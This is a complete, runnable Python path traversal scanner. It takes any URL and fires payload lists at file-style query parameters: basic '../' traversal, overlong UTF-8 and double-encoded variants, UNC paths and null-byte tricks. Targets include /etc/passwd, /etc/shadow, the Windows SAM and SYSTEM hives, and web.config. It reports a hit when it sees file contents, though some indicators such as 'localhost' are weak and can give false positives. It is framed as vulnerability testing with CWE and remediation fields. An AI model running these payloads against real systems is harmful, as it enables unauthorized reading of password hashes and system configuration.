#!/usr/bin/env python3
"""
Advanced Path Traversal Scanner
Tests for path traversal vulnerabilities including unicode bypass,
double encoding, OS-specific tricks, and filter bypasses
"""

import requests
import json
from datetime import datetime
from urllib.parse import urlparse, urljoin, parse_qs, urlencode, urlunparse

class AdvancedPathTraversalScanner:
    """Advanced path traversal vulnerability scanner"""

    def __init__(self, target_url, output_file=None):
        self.target_url = target_url
        self.output_file = output_file
        self.vulnerabilities = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        })

    def scan(self):
        """Run advanced path traversal tests"""
        print(f"[*] Starting advanced path traversal testing on {self.target_url}")

        # Test basic traversal
        self._test_basic_traversal()

        # Test unicode bypass
        self._test_unicode_bypass()

        # Test double encoding
        self._test_double_encoding()

        # Test OS-specific tricks
        self._test_os_specific()

        # Test null byte injection
        self._test_null_byte()

        # Save results
        if self.output_file:
            self._save_results()

        return {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities
        }

    def _test_basic_traversal(self):
        """Test basic path traversal"""
        print("[*] Testing basic path traversal...")

        # Basic traversal payloads
        basic_payloads = [
            # Linux/Unix
            ('../../../etc/passwd', '/etc/passwd'),
            ('../../../../etc/passwd', '/etc/passwd'),
            ('../../../../../etc/passwd', '/etc/passwd'),
            ('../../../../../../etc/passwd', '/etc/passwd'),
            ('../../../etc/hosts', '/etc/hosts'),
            ('../../../etc/shadow', '/etc/shadow'),

            # Windows
            ('..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', 'Windows hosts'),
            ('..\\..\\..\\boot.ini', 'boot.ini'),
            ('..\\..\\..\\windows\\win.ini', 'win.ini'),
            ('..\\..\\..\\windows\\system.ini', 'system.ini'),

            # Absolute paths
            ('/etc/passwd', '/etc/passwd'),
            ('/etc/shadow', '/etc/shadow'),
            ('C:\\windows\\system32\\drivers\\etc\\hosts', 'Windows hosts'),
            ('C:\\boot.ini', 'boot.ini'),
        ]

        for payload, target_file in basic_payloads:
            if self._test_traversal_payload(payload, f'Basic Traversal - {target_file}'):
                return

    def _test_unicode_bypass(self):
        """Test unicode/UTF-8 bypass techniques"""
        print("[*] Testing unicode bypass...")

        # Unicode bypass payloads
        unicode_payloads = [
            # Overlong UTF-8 encoding of ../
            ('..%c0%af..%c0%af..%c0%afetc%c0%afpasswd', 'Unicode Overlong (c0af)'),
            ('..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd', 'Unicode Overlong (c19c)'),

            # UTF-8 encoding variations
            ('..%c0%2f..%c0%2f..%c0%2fetc%c0%2fpasswd', 'UTF-8 Slash Encoding'),

            # 16-bit Unicode
            ('..%u2216..%u2216..%u2216etc%u2216passwd', '16-bit Unicode'),

            # Mixed encoding
            ('..%c0%af..%2f..%5cetc/passwd', 'Mixed Encoding'),

            # Double dot encoding
            ('%2e%2e/%2e%2e/%2e%2e/etc/passwd', 'Encoded Dots'),
            ('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'Fully Encoded'),

            # Unicode dot
            ('\u002e\u002e/\u002e\u002e/\u002e\u002e/etc/passwd', 'Unicode Dots'),
        ]

        for payload, description in unicode_payloads:
            if self._test_traversal_payload(payload, description):
                return

    def _test_double_encoding(self):
        """Test double/nested encoding"""
        print("[*] Testing double encoding...")

        # Double encoding payloads
        double_encoding_payloads = [
            # Double URL encoding
            ('..%252f..%252f..%252fetc%252fpasswd', 'Double URL Encoding'),
            ('..%255c..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts', 'Double Backslash Encoding'),

            # Triple encoding
            ('..%25252f..%25252f..%25252fetc%25252fpasswd', 'Triple URL Encoding'),

            # Mixed double encoding
            ('%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd', 'Double Encoded Full Path'),

            # Nested encoding
            ('%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'URL Encoded Dots and Slashes'),

            # HTML entity encoding
            ('..&#47;..&#47;..&#47;etc&#47;passwd', 'HTML Entity Slash'),
            ('..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd', 'Hex HTML Entity'),
        ]

        for payload, description in double_encoding_payloads:
            if self._test_traversal_payload(payload, description):
                return

    def _test_os_specific(self):
        """Test OS-specific path traversal tricks"""
        print("[*] Testing OS-specific tricks...")

        # OS-specific payloads
        os_specific_payloads = [
            # Linux specific
            ('....//....//....//etc/passwd', 'Dot-Dot-Slash Bypass'),
            ('..;/..;/..;/etc/passwd', 'Semicolon Bypass'),
            ('....\/....\/....\/etc/passwd', 'Mixed Slash Bypass'),

            # Windows specific
            ('..\\..\\..\\windows\\system32\\config\\sam', 'SAM Database'),
            ('..\\..\\..\\windows\\repair\\sam', 'Backup SAM'),
            ('..\\..\\..\\windows\\system32\\config\\system', 'SYSTEM Hive'),
            ('..\\..\\..\\inetpub\\wwwroot\\web.config', 'IIS web.config'),

            # UNC paths (Windows)
            ('\\\\127.0.0.1\\c$\\windows\\system32\\drivers\\etc\\hosts', 'UNC Localhost'),
            ('\\\\localhost\\c$\\boot.ini', 'UNC boot.ini'),

            # Case variations (for case-insensitive systems)
            ('../../../ETC/PASSWD', 'Uppercase Path'),
            ('../../../EtC/pAsSwD', 'Mixed Case'),

            # Backslash vs forward slash
            ('../../../etc/passwd', 'Forward Slash'),
            ('..\\..\\..\\etc\\passwd', 'Backslash on Unix'),

            # Multiple slashes
            ('...//...//.../etc/passwd', 'Multiple Slashes'),
            ('...//...//etc/passwd', 'Three Dots Double Slash'),
        ]

        for payload, description in os_specific_payloads:
            if self._test_traversal_payload(payload, description):
                return

    def _test_null_byte(self):
        """Test null byte injection"""
        print("[*] Testing null byte injection...")

        # Null byte payloads (works in PHP < 5.3.4)
        null_byte_payloads = [
            ('../../../etc/passwd%00', 'Null Byte'),
            ('../../../etc/passwd%00.jpg', 'Null Byte with Extension'),
            ('../../../etc/passwd\x00', 'Raw Null Byte'),
            ('../../../etc/passwd\x00.txt', 'Raw Null with Extension'),

            # URL encoded null byte
            ('../../../etc/passwd%2500', 'Encoded Null Byte'),
            ('../../../etc/passwd%2500.png', 'Encoded Null with Extension'),

            # Unicode null byte
            ('../../../etc/passwd%u0000', 'Unicode Null Byte'),
        ]

        for payload, description in null_byte_payloads:
            if self._test_traversal_payload(payload, description):
                return

    def _test_traversal_payload(self, payload, description):
        """Test single path traversal payload"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)

        # Common parameter names for path traversal
        traversal_params = ['file', 'path', 'document', 'folder', 'page', 'include', 'root', 'pg', 'dir', 'directory', 'style', 'pdf', 'template', 'download', 'doc']

        # Find parameter to inject into
        target_param = None
        for param in traversal_params:
            if param in params:
                target_param = param
                break

        if not target_param and params:
            # Use first parameter
            target_param = list(params.keys())[0]

        if not target_param:
            # Try common parameters anyway
            target_param = 'file'

        # Build test URL
        test_params = params.copy()
        test_params[target_param] = [payload]

        query_string = urlencode(test_params, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, query_string, parsed.fragment))

        try:
            response = self.session.get(test_url, timeout=15, allow_redirects=False)

            # Check for traversal indicators
            traversal_indicators = [
                'root:x:0:0',  # /etc/passwd
                'daemon:',     # /etc/passwd entries
                'bin:x:',
                'sys:x:',
                '[boot loader]',  # boot.ini
                '[operating systems]',  # boot.ini
                'localhost',
                '127.0.0.1',
                '# Copyright',  # hosts file
                '[fonts]',  # win.ini
                '[extensions]',  # win.ini
                '[drivers]',  # system.ini
            ]

            for indicator in traversal_indicators:
                if indicator in response.text:
                    severity = 'critical'

                    # Determine what was disclosed
                    if 'root:x:0:0' in response.text or 'daemon:' in response.text:
                        evidence = f'{description} - /etc/passwd disclosed'
                        impact = 'Read sensitive files, enumerate system users'
                    elif '[boot loader]' in response.text:
                        evidence = f'{description} - boot.ini disclosed'
                        impact = 'Windows configuration disclosure'
                    elif '[fonts]' in response.text or '[extensions]' in response.text:
                        evidence = f'{description} - Windows INI file disclosed'
                        impact = 'System configuration disclosure'
                    elif '127.0.0.1' in response.text or 'localhost' in response.text:
                        evidence = f'{description} - hosts file disclosed'
                        impact = 'Network configuration disclosure'
                    else:
                        evidence = f'{description} - Found: {indicator}'
                        impact = 'Read arbitrary files from filesystem'

                    vuln = {
                        'type': 'Path Traversal',
                        'severity': severity,
                        'url': test_url,
                        'payload': payload,
                        'parameter': target_param,
                        'evidence': evidence,
                        'description': f'Path traversal via {description}',
                        'cwe': 'CWE-22',
                        'impact': impact,
                        'remediation': 'Validate file paths, use allowlist, sanitize input'
                    }
                    self.vulnerabilities.append(vuln)
                    print(f"[!] Path traversal found: {description}")
                    return True

            # Check for error messages that might indicate successful traversal
            error_indicators = [
                'failed to open stream',
                'No such file or directory',
                'Permission denied',
                'file_get_contents',
                'include(',
                'require(',
                'fopen(',
            ]

            for error in error_indicators:
                if error in response.text:
                    # Might indicate traversal attempt was processed
                    # But don't report as vulnerability unless we see actual file content
                    pass

        except requests.exceptions.Timeout:
            pass
        except requests.exceptions.ConnectionError:
            pass
        except Exception as e:
            pass

        return False

    def _save_results(self):
        """Save results to file"""
        results = {
            'target': self.target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerabilities': self.vulnerabilities,
            'summary': {
                'total': len(self.vulnerabilities),
                'critical': sum(1 for v in self.vulnerabilities if v['severity'] == 'critical'),
                'high': sum(1 for v in self.vulnerabilities if v['severity'] == 'high')
            }
        }

        with open(self.output_file, 'w') as f:
            json.dump(results, f, indent=2)


if __name__ == "__main__":
    import sys

    if len(sys.argv) < 2:
        print("Usage: python3 path_traversal_advanced.py <url> [output_file]")
        print("\nExample:")
        print("  python3 path_traversal_advanced.py 'https://example.com/download?file=report.pdf'")
        print("\nTests for:")
        print("  - Basic path traversal (../../../etc/passwd)")
        print("  - Unicode bypass (..%c0%af)")
        print("  - Double encoding (..%252f)")
        print("  - OS-specific tricks (UNC paths, case variations)")
        print("  - Null byte injection (%00)")
        sys.exit(1)

    target = sys.argv[1]
    output = sys.argv[2] if len(sys.argv) > 2 else None

    scanner = AdvancedPathTraversalScanner(target, output)
    results = scanner.scan()

    print(f"\n[+] Scan complete!")
    print(f"    Total vulnerabilities: {len(results['vulnerabilities'])}")
    if len(results['vulnerabilities']) > 0:
        print(f"    Critical: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'critical')}")
        print(f"    High: {sum(1 for v in results['vulnerabilities'] if v['severity'] == 'high')}")
